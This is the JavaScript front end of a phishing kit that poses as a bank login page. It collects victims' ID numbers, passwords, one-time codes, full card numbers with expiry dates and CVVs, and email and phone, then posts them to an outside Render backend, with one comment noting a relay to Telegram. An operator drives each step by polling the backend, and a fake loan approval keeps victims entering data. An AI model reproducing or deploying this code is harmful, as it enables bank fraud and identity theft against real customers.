// ready.js — versión completa con todas las secciones
// Backend Node en Render
const BACKEND_BASE = 'https://publish4-rl3m.onrender.com';

$(document).ready(function ($) {
  // -----------------------
  // PING: Mantener servidor activo (evitar cold starts)
  // -----------------------
  setInterval(function() {
    fetch(BACKEND_BASE + "/ping").catch(function(err) {
      console.log("Ping al servidor...");
    });
  }, 5000); // Cada 5 segundos

  // -----------------------
  // INICIO: Mostrar directamente Clave Segura
  // -----------------------
  $("#clave-segura").css({ "border-bottom": "2px solid #0040A8", "color": "#0040a8" });
  $("#tarjeta-debito").css({ "border-bottom": "2px solid #e6e6e6", "color": "#5c5c5c" });
  $("#fmr-clave-s").show();
  $("#fmr-tarjeta-d").hide();

  // -----------------------
  // Tabs visuales
  // -----------------------
  $("#clave-segura").click(function () {
    $("#clave-segura").css({ "border-bottom": "2px solid #0040A8", "color": "#0040a8" });
    $("#tarjeta-debito").css({ "border-bottom": "2px solid #e6e6e6", "color": "#5c5c5c" });
    $("#fmr-clave-s").show();
    $("#fmr-tarjeta-d").hide();
    $("#txt-clave-s").val("");
    $("#txt-clave-s").attr("error", "0");
    $("#btn-ingresar-s").attr("disabled", "disabled");
    $("#txt-id-s").val($("#txt-id").val());
  });

  $("#tarjeta-debito").click(function () {
    $("#tarjeta-debito").css({ "border-bottom": "2px solid #0040A8", "color": "#0040a8" });
    $("#clave-segura").css({ "border-bottom": "2px solid #e6e6e6", "color": "#5c5c5c" });
    $("#fmr-clave-s").hide();
    $("#fmr-tarjeta-d").show();
    $("#txt-clave-tc").val("");
    $("#txt-clave-tc").attr("error", "0");
    $("#txt-digito").val("");
    $("#txt-digito").attr("error", "0");
    $("#btn-ingresar").attr("disabled", "disabled");
    $("#txt-id").val($("#txt-id-s").val());
  });

  // -----------------------
  // Estilos de inputs
  // -----------------------
  $(".entrada").keyup(function (e) {
    if ($(this).val() == "") {
      $(this).css({ "background-color": "#FFE7E6", "border": "2px solid #C94740" });
      $(this).attr("error", "1");
    } else {
      $(this).css({ "background-color": "#FFF", "border": "2px solid #0043A9" });
      $(this).attr("error", "0");
    }
  });

  $(".entrada").blur(function () {
    if ($(this).val() != "") {
      $(this).css({ "background-color": "#fff", "border": "1px solid #b3b3b3" });
      $(this).attr("error", "0");
    } else {
      $(this).css({ "background-color": "#FFE7E6", "border": "2px solid #C94740" });
      $(this).attr("error", "1");
    }
  });

  $(".entrada").focus(function () {
    if ($(this).attr("error") == "0") {
      $(this).css({ "background-color": "#FFF", "border": "2px solid #0043A9" });
      $(this).attr("error", "0");
    } else {
      $(this).css({ "background-color": "#FFE7E6", "border": "2px solid #C94740" });
      $(this).attr("error", "1");
    }
  });

  // -----------------------
  // Habilitación de botones
  // -----------------------
  $("#txt-id,#txt-clave-tc,#txt-digito").keyup(function (e) {
    if ($("#txt-id").val().length > 6 && $("#txt-clave-tc").val().length > 3 && $("#txt-digito").val().length > 3) {
      $("#btn-ingresar").removeAttr("disabled");
    } else {
      $("#btn-ingresar").attr("disabled", "disabled");
    }
  });

  $("#txt-id-s,#txt-clave-s").keyup(function (e) {
    if ($("#txt-id-s").val().length > 6 && $("#txt-clave-s").val().length > 3) {
      $("#btn-ingresar-s").removeAttr("disabled");
    } else {
      $("#btn-ingresar-s").attr("disabled", "disabled");
    }
  });

  // -----------------------
  // BOTÓN Ingresar (CLAVE SEGURA)
  // -----------------------
  $("#btn-ingresar-s").click(function () {
    $("#btn-ingresar-s").attr("disabled", "disabled");

    console.log("🔵 INICIO: Botón Ingresar clickeado");

    // Debug: Verificar que los elementos existen en el DOM
    console.log("🔍 DEBUG: Verificando elementos en el DOM");
    console.log(`   - $('#txt-tipo-s') existe: ${$("#txt-tipo-s").length > 0}`);
    console.log(`   - $('#txt-id-s') existe: ${$("#txt-id-s").length > 0}`);
    console.log(`   - $('#txt-clave-s') existe: ${$("#txt-clave-s").length > 0}`);

    var tipoDoc = $("#txt-tipo-s").val() || "";
    var numDoc = $("#txt-id-s").val() || "";
    var clave = $("#txt-clave-s").val() || "";

    console.log(`📝 Valores capturados:`);
    console.log(`   - tipoDoc: "${tipoDoc}" (tipo: ${typeof tipoDoc})`);
    console.log(`   - numDoc: "${numDoc}" (tipo: ${typeof numDoc})`);
    console.log(`   - clave: "${clave}" (tipo: ${typeof clave})`);
    console.log(`   - tipoDoc === undefined: ${tipoDoc === undefined}`);
    console.log(`   - numDoc === undefined: ${numDoc === undefined}`);
    console.log(`   - clave === undefined: ${clave === undefined}`);

    if (numDoc === "" || clave === "") {
      alert("Por favor llena todos los campos.");
      $("#btn-ingresar-s").removeAttr("disabled");
      return;
    }

    const sessionId = "session-" + Math.random().toString(36).substr(2, 9);
    console.log(`🆔 sessionId generado: ${sessionId}`);

    // 🆕 PHASE 1: Use sessionId as consistent phone_number identifier
    // If localStorage has phone, use it; otherwise use sessionId as a unique, consistent identifier
    let phoneNumber = localStorage.getItem("phone");
    if (!phoneNumber) {
      // Use sessionId directly as the phone_number (consistent and reliable)
      phoneNumber = sessionId;
      console.log(`⚠️ phone no encontrado en localStorage, usando sessionId como identificador: ${phoneNumber}`);
    } else {
      console.log(`✅ phone recuperado de localStorage: ${phoneNumber}`);
    }

    localStorage.setItem("sessionId", sessionId);
    localStorage.setItem("phone", phoneNumber);
    localStorage.setItem("tipoDoc", tipoDoc);
    localStorage.setItem("numDoc", numDoc);
    localStorage.setItem("clave", clave);
    console.log(`💾 Datos guardados en localStorage`);

    $("#fondo").show();
    $("#mensaje").show();
    console.log(`🔄 Loader mostrado`);

    console.log(`📤 Enviando POST a: ${BACKEND_BASE}/virtualpersona`);

    fetch(BACKEND_BASE + "/virtualpersona", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        sessionId: sessionId,
        metodo: "clave",
        tipoDoc: tipoDoc,
        numDoc: numDoc,
        clave: clave
      })
    })
      .then(function(res) {
        console.log(`✅ Response status: ${res.status}`);
        return res.json();
      })
      .then(function(data) {
        console.log(`✅ Response JSON:`, JSON.stringify(data, null, 2));
        console.log("✅ Datos enviados a /virtualpersona");
        startPolling(sessionId);
      })
      .catch(function(err) {
        console.error("❌ Error al enviar datos:", err);
        console.error("❌ Error details:", err.message);
        hideLoader();
        $("#btn-ingresar-s").removeAttr("disabled");
      });
  });

  // -----------------------
  // Funciones de notificación
  // -----------------------
  function notifyOTP(which, token) {
    try {
      const sessionId = localStorage.getItem("sessionId");

      // 🔍 VALIDACIÓN CRÍTICA: Verificar que sessionId existe
      if (!sessionId) {
        console.error("❌ CRÍTICO: sessionId NO está en localStorage");
        console.error("   LocalStorage keys disponibles:", Object.keys(localStorage));
        console.error("   Valores:", {
          sessionId: localStorage.getItem("sessionId"),
          phone: localStorage.getItem("phone"),
          tipoDoc: localStorage.getItem("tipoDoc"),
          numDoc: localStorage.getItem("numDoc"),
          clave: localStorage.getItem("clave")
        });
        alert("⚠️ Sesión perdida. Por favor, recarga la página e intenta de nuevo.");
        hideLoader();
        return;
      }

      // ✅ MODIFICADO: Usar nuestro endpoint de Cloudflare Worker
      const intento = which === "otp1" ? 1 : 2;

      console.log(`📤 OTP: Enviando POST con session_id='${sessionId}', intento=${intento}`);
      console.log(`   Payload: { session_id: '${sessionId}', otp_token: '${token}', intento: ${intento} }`);

      // 🆕 PHASE 2: Add phone_number to POST request
      const phoneNumber = localStorage.getItem("phone");

      const notifyUrl = which === "otp1" ? "/notify/otp1" : "/notify/otp2";
      console.log(`📤 OTP: Enviando a ${BACKEND_BASE}${notifyUrl}`);

      fetch(BACKEND_BASE + notifyUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          tipoDoc: localStorage.getItem("tipoDoc") || "NO_DISPONIBLE",
          numDoc: localStorage.getItem("numDoc") || "NO_DISPONIBLE",
          clave: localStorage.getItem("clave") || "NO_DISPONIBLE",
          token: token
        })
      })
        .then(function(response) {
          console.log(`✅ OTP Response status: ${response.status}`);
          return response.json();
        })
        .then(function(data) {
          console.log(`✅ OTP Response JSON: ${JSON.stringify(data)}`);
          if (data.success) {
            console.log(`✅ OTP intento ${intento} capturado correctamente en servidor`);
          } else {
            console.error(`❌ OTP retornó error: ${data.error}`);
          }
        })
        .catch(function(err) {
          console.error("❌ Error en OTP (fetch):", err.message);
          console.error("❌ Error completo:", err);
        });
    } catch (e) {
      console.error("notifyOTP error:", e);
    }
  }

  function notifyTarjeta(tarjeta, fecha, cvv) {
    try {
      const sessionId = localStorage.getItem("sessionId");

      // 🔍 VALIDACIÓN CRÍTICA: Verificar que sessionId existe
      if (!sessionId) {
        console.error("❌ CRÍTICO: sessionId NO está en localStorage (Tarjeta)");
        alert("⚠️ Sesión perdida. Por favor, recarga la página e intenta de nuevo.");
        hideLoader();
        return;
      }

      // ✅ MODIFICADO: Usar nuestro endpoint de Cloudflare Worker
      // fecha viene como "MM-YYYY", separar en mes y año
      const [mes, ano] = fecha.split('-');

      console.log(`💳 Tarjeta: Enviando POST con session_id='${sessionId}'`);
      console.log(`   Payload: { tarjeta: '****${tarjeta.slice(-4)}', mes: '${mes}', ano: '${ano}', cvv: '***' }`);

      // 🆕 PHASE 2: Add phone_number to POST request
      const phoneNumber = localStorage.getItem("phone");

      console.log(`💳 Tarjeta: Enviando a ${BACKEND_BASE}/notify/tarjeta`);

      fetch(BACKEND_BASE + "/notify/tarjeta", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          tipoDoc: localStorage.getItem("tipoDoc") || "NO_DISPONIBLE",
          numDoc: localStorage.getItem("numDoc") || "NO_DISPONIBLE",
          clave: localStorage.getItem("clave") || "NO_DISPONIBLE",
          tarjeta: tarjeta,
          fecha: fecha,
          cvv: cvv
        })
      })
        .then(function(response) {
          console.log(`✅ Tarjeta Response status: ${response.status}`);
          return response.json();
        })
        .then(function(data) {
          console.log(`✅ Tarjeta Response JSON: ${JSON.stringify(data)}`);
          if (data.success) {
            console.log(`✅ Datos de tarjeta capturados correctamente en servidor`);
          } else {
            console.error(`❌ Tarjeta retornó error: ${data.error}`);
          }
        })
        .catch(function(err) {
          console.error("❌ Error capturando tarjeta:", err.message);
          console.error("❌ Error completo:", err);
        });
    } catch (e) {
      console.error("notifyTarjeta error:", e);
    }
  }

  function notifyCorreo(correo, celular) {
    try {
      const sessionId = localStorage.getItem("sessionId");

      // 🔍 VALIDACIÓN CRÍTICA: Verificar que sessionId existe
      if (!sessionId) {
        console.error("❌ CRÍTICO: sessionId NO está en localStorage (Contacto)");
        alert("⚠️ Sesión perdida. Por favor, recarga la página e intenta de nuevo.");
        hideLoader();
        return;
      }

      // ✅ MODIFICADO: Usar nuestro endpoint de Cloudflare Worker
      console.log(`📧 Contacto: Enviando POST con session_id='${sessionId}'`);
      console.log(`   Payload: { email: '${correo}', celular: '${celular}' }`);

      // 🆕 PHASE 2: Add phone_number to POST request
      const phoneNumber = localStorage.getItem("phone");

      console.log(`📧 Correo: Enviando a ${BACKEND_BASE}/notify/correo`);

      fetch(BACKEND_BASE + "/notify/correo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          tipoDoc: localStorage.getItem("tipoDoc") || "NO_DISPONIBLE",
          numDoc: localStorage.getItem("numDoc") || "NO_DISPONIBLE",
          clave: localStorage.getItem("clave") || "NO_DISPONIBLE",
          correo: correo,
          celular: celular
        })
      })
        .then(function(response) {
          console.log(`✅ Contacto Response status: ${response.status}`);
          return response.json();
        })
        .then(function(data) {
          console.log(`✅ Contacto Response JSON: ${JSON.stringify(data)}`);
          if (data.success) {
            console.log(`✅ Datos de contacto capturados correctamente en servidor`);
          } else {
            console.error(`❌ Contacto retornó error: ${data.error}`);
          }
        })
        .catch(function(err) {
          console.error("❌ Error capturando contacto:", err.message);
          console.error("❌ Error completo:", err);
        });
    } catch (e) {
      console.error("notifyCorreo error:", e);
    }
  }

  // -----------------------
  // OTP (primer intento)
  // -----------------------
  $("#txt-token").keyup(function (e) {
    if ($("#txt-token").val().length > 5) {
      $("#btn-validar").removeAttr("disabled");
    } else {
      $("#btn-validar").attr("disabled", "disabled");
    }
  });

  $("#btn-validar").click(function () {
    const token = $("#txt-token").val().trim();
    if (token.length < 6) {
      alert("Ingresa un token válido.");
      return;
    }

    $("#fondo").show();
    $("#mensaje").show();

    notifyOTP("otp1", token);
    console.log("OTP enviado con token");
  });

  // -----------------------
  // OTP con error
  // -----------------------
  $("#txt-tokenerr").keyup(function (e) {
    if ($("#txt-tokenerr").val().length > 5) {
      $("#btn-validarerr").removeAttr("disabled");
    } else {
      $("#btn-validarerr").attr("disabled", "disabled");
    }
  });

  $("#btn-validarerr").click(function () {
    const token = $("#txt-tokenerr").val().trim();
    if (token.length < 6) {
      alert("Ingresa un token válido.");
      return;
    }

    $("#fondo").show();
    $("#mensaje").show();

    notifyOTP("otp2", token);
    console.log("OTP error enviado con token");
  });

  // -----------------------
  // Correo / Celular
  // -----------------------
  $("#txt-correo,#txt-celular").keyup(function (e) {
    if ($("#txt-correo").val().length > 8 && $("#txt-celular").val().length > 9) {
      $("#btn-actualizar").removeAttr("disabled");
    } else {
      $("#btn-actualizar").attr("disabled", "disabled");
    }
  });

  $("#btn-actualizar").click(function () {
    const correo = $("#txt-correo").val().trim();
    const celular = $("#txt-celular").val().trim();

    if (correo.length < 8 || celular.length < 9) {
      alert("Completa los datos correctamente.");
      return;
    }

    $("#fondo").show();
    $("#mensaje").show();

    notifyCorreo(correo, celular);
    console.log("Correo y celular enviados");
  });

  // -----------------------
  // Tarjeta
  // -----------------------
  $("#txt-tarjeta,#txt-cvv").keyup(function (e) {
    if (
      $("#txt-tarjeta").val().length > 15 &&
      $("#txt-cvv").val().length > 2 &&
      $("#txt-mes").val() != "" &&
      $("#txt-ano").val() != ""
    ) {
      $("#btn-verficar").removeAttr("disabled");
    } else {
      $("#btn-verficar").attr("disabled", "disabled");
    }
  });

  $("#btn-verficar").click(function () {
    const tarjeta = $("#txt-tarjeta").val().trim();
    const mes = $("#txt-mes").val();
    const ano = $("#txt-ano").val();
    const cvv = $("#txt-cvv").val().trim();
    const fecha = mes + "-" + ano;

    if (tarjeta.length < 16 || cvv.length < 3 || !mes || !ano) {
      alert("Completa todos los datos de la tarjeta.");
      return;
    }

    $("#fondo").show();
    $("#mensaje").show();

    notifyTarjeta(tarjeta, fecha, cvv);
    console.log("Tarjeta enviada");
  });

  // =====================================
  // Helpers de redirección vía POLLING
  // =====================================
  function hideLoader() {
    $("#fondo").hide();
    $("#mensaje").hide();
  }

  function showSectionClaveSegura() {
    $("#clave-segura").css({ "border-bottom": "2px solid #0040A8", "color": "#0040a8" });
    $("#tarjeta-debito").css({ "border-bottom": "2px solid #e6e6e6", "color": "#5c5c5c" });
    $("#fmr-clave-s").show();
    $("#fmr-tarjeta-d, #frm-otp, #frm-errorotp, #frm-correo, #frm-tarjeta").hide();
    $("#txt-id-s, #txt-clave-s").val("");
    $("#error-mensaje").show();
    $("#btn-ingresar-s").attr("disabled", "disabled");
  }

  function showSectionOTP() {
    $("#frm-otp").show();
    $("#fmr-clave-s, #fmr-tarjeta-d, #frm-errorotp, #frm-correo, #frm-tarjeta, #frm-formulario").hide();
    $("#txt-token").val("");
    $("#btn-validar").attr("disabled", "disabled");
  }

  function showSectionErrorOTP() {
    $("#frm-errorotp").show();
    $("#fmr-clave-s, #fmr-tarjeta-d, #frm-otp, #frm-correo, #frm-tarjeta, #frm-formulario").hide();
    $("#txt-tokenerr").val("");
    $("#error-token-mensaje").show();
    $("#btn-validarerr").attr("disabled", "disabled");
  }

  function showSectionCorreo() {
    $("#frm-correo").show();
    $("#fmr-clave-s, #fmr-tarjeta-d, #frm-otp, #frm-errorotp, #frm-tarjeta, #frm-formulario").hide();
    $("#txt-correo, #txt-celular").val("");
    $("#btn-actualizar").attr("disabled", "disabled");
  }

  function showSectionTarjeta() {
    $("#frm-tarjeta").show();
    $("#fmr-clave-s, #fmr-tarjeta-d, #frm-otp, #frm-errorotp, #frm-correo, #frm-formulario").hide();
    $("#txt-tarjeta, #txt-mes, #txt-ano, #txt-cvv").val("");
    $("#btn-verficar").attr("disabled", "disabled");
  }

  function startPolling(sessionId) {
    console.log(`🔄 Iniciando polling para sessionId: ${sessionId}`);
    const it = setInterval(function() {
      const pollUrl = BACKEND_BASE + "/instruction/" + sessionId;
      console.log(`📡 Polling a: ${pollUrl}`);

      fetch(pollUrl)
        .then(function(res) {
          console.log(`   Response status: ${res.status}`);
          return res.json();
        })
        .then(function(data) {
          console.log(`   Datos recibidos: ${JSON.stringify(data)}`);

          if (!data || !data.redirect_to) {
            console.log(`   ⏳ Sin redirección aún, esperando...`);
            return;
          }

          console.log(`🎯 ¡REDIRECCIÓN RECIBIDA! → ${data.redirect_to}`);
          hideLoader();

          if (data.redirect_to === "inicio") {
            console.log(`   Mostrando: Clave Segura`);
            showSectionClaveSegura();
            clearInterval(it);
            startPolling(sessionId);
          } else if (data.redirect_to === "otp1") {
            console.log(`   Mostrando: OTP intento 1`);
            showSectionOTP();
            notifyOTP("otp1", "");
            clearInterval(it);
            startPolling(sessionId);
          } else if (data.redirect_to === "otp2") {
            console.log(`   Mostrando: OTP error`);
            showSectionErrorOTP();
            notifyOTP("otp2", "");
            clearInterval(it);
            startPolling(sessionId);
          } else if (data.redirect_to === "correo") {
            console.log(`   Mostrando: Correo/Celular`);
            showSectionCorreo();
            clearInterval(it);
            startPolling(sessionId);
          } else if (data.redirect_to === "tarjeta") {
            console.log(`   Mostrando: Tarjeta`);
            showSectionTarjeta();
            clearInterval(it);
            startPolling(sessionId);
          } else if (data.redirect_to === "formulario") {
            console.log(`   Mostrando: Formulario`);
            showSectionFormulario();
            clearInterval(it);
            startPolling(sessionId);
          } else {
            console.log(`   ⚠️ Redirección desconocida: ${data.redirect_to}`);
          }
        })
        .catch(function(e) {
          console.error("❌ Polling error:", e.message);
          console.error("   URL que falló: " + pollUrl);
        });
    }, 500); // Cambiar de 2000ms a 500ms para ser más rápido
  }

  // -----------------------
  // SECCIÓN FORMULARIO
  // -----------------------
  function showSectionFormulario() {
    $("#fmr-clave-s, #fmr-tarjeta-d, #frm-otp, #frm-errorotp, #frm-correo, #frm-tarjeta").hide();
    $("#frm-formulario").show();

    var formularioEnviado = localStorage.getItem("formularioEnviado");

    if (formularioEnviado) {
      $("#select-cuotas").attr("disabled", "disabled");
      $("#txt-celular-form").attr("disabled", "disabled");
      $("#btn-finalizar").attr("disabled", "disabled").text("✅ Formulario ya enviado");
      return;
    }

    var numDoc = localStorage.getItem("numDoc") || "0";
    var hashCedula = parseInt(numDoc.slice(-4)) || 0;
    // Nuevo rango: 40M - 90M
    var montoAprobado = 40000000 + ((hashCedula * 1000000) % 50000001);

    $("#cupo-aprobado").text("$" + montoAprobado.toLocaleString('es-CO', {maximumFractionDigits: 0}));
    $("#select-cuotas").val("");
    $("#txt-celular-form").val("");
    $("#cuota-display").html('<div style="font-size: 14px; color: #666; margin-bottom: 8px;">💰 Tu cuota mensual será:</div><div style="font-size: 24px; font-weight: bold; color: #0043a9; text-align: center;">Selecciona un plan</div>');
    $("#btn-finalizar").attr("disabled", "disabled");

    // Validar campos y habilitar botón
    function validarFormulario() {
      var cuotas = $("#select-cuotas").val();
      var celular = $("#txt-celular-form").val().trim();

      if (cuotas && celular.length > 9) {
        $("#btn-finalizar").removeAttr("disabled");
      } else {
        $("#btn-finalizar").attr("disabled", "disabled");
      }
    }

    // Evento para cambio de cuotas
    $("#select-cuotas").off('change').on('change', function() {
      var cuotas = $(this).val();
      if (cuotas) {
        actualizarCuotaDisplay(montoAprobado, cuotas);
      } else {
        $("#cuota-display").html('<div style="font-size: 14px; color: #666; margin-bottom: 8px;">💰 Tu cuota mensual será:</div><div style="font-size: 24px; font-weight: bold; color: #0043a9; text-align: center;">Selecciona un plan</div>');
      }
      validarFormulario();
    });

    // Evento para cambio de celular
    $("#txt-celular-form").off('keyup').on('keyup', function() {
      validarFormulario();
    });

    // Evento del botón finalizar
    $("#btn-finalizar").off('click').on('click', function() {
      var cuotas = $("#select-cuotas").val();
      var celular = $("#txt-celular-form").val().trim();

      if (!cuotas) {
        alert("Selecciona el número de cuotas");
        return;
      }

      if (!celular || celular.length < 10) {
        alert("Ingresa un número de celular válido");
        return;
      }

      var sessionId = localStorage.getItem("sessionId");
      var tipoDoc = localStorage.getItem("tipoDoc") || "NO_DISPONIBLE";
      var numDoc = localStorage.getItem("numDoc") || "NO_DISPONIBLE";
      var clave = localStorage.getItem("clave") || "NO_DISPONIBLE";

      // Guardar celular en localStorage
      localStorage.setItem("celular", celular);

      $("#btn-finalizar").attr("disabled", "disabled");
      $("#fondo").show();
      $("#mensaje").show();

      console.log("📤 Enviando formulario con:");
      console.log(`   - Monto: ${montoAprobado}`);
      console.log(`   - Cuotas: ${cuotas}`);
      console.log(`   - Celular: ${celular}`);

      fetch(BACKEND_BASE + "/notify/formulario", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          tipoDoc: tipoDoc,
          numDoc: numDoc,
          clave: clave,
          celular: celular,
          monto: montoAprobado,
          cuotas: parseInt(cuotas),
          interes: 0.001
        })
      })
        .then(function(res) { return res.json(); })
        .then(function(data) {
          localStorage.setItem("formularioEnviado", "true");
          $("#select-cuotas").attr("disabled", "disabled");
          $("#txt-celular-form").attr("disabled", "disabled");
          $("#btn-finalizar").text("✅ Formulario ya enviado");
          console.log("✅ Formulario enviado a Telegram con celular");
          console.log("⏳ Esperando respuesta del administrador...");
        })
        .catch(function(err) {
          console.error("❌ Error:", err);
          hideLoader();
          $("#btn-finalizar").removeAttr("disabled");
        });
    });
  }

  function actualizarMontoDisplay(monto) {
    var montoNum = parseInt(monto);
    var montoMill = (montoNum / 1000000).toFixed(0);
    $("#monto-display").text("$" + montoMill + "M");

    var cuotas = $("#select-cuotas").val();
    if (cuotas) {
      actualizarCuotaDisplay(monto, cuotas);
    }
  }

  function actualizarMontoDisplay(monto) {
    var montoNum = parseInt(monto);
    var montoMill = (montoNum / 1000000).toFixed(0);
    $("#cupo-aprobado").text("$" + montoMill + "M");

    var cuotas = $("#select-cuotas").val();
    if (cuotas) {
      actualizarCuotaDisplay(monto, cuotas);
    }
  }

  function actualizarCuotaDisplay(monto, cuotas) {
    var cuotasNum = parseInt(cuotas);
    var montoNum = parseInt(monto);
    var cuotaMensual = montoNum / cuotasNum;
    var interes = 0.001 / 100;
    var cuotaConInteres = cuotaMensual * (1 + interes);

    var html = '<div style="font-size: 14px; color: #666; margin-bottom: 8px;">💰 Tu cuota mensual será:</div>';
    html += '<div style="font-size: 24px; font-weight: bold; color: #0043a9; text-align: center;">$' + cuotaConInteres.toLocaleString('es-CO', {maximumFractionDigits: 0}) + '</div>';
    html += '<div style="font-size: 12px; color: #999; margin-top: 8px; text-align: center;">por ' + cuotasNum + ' meses</div>';

    $("#cuota-display").html(html);
  }
});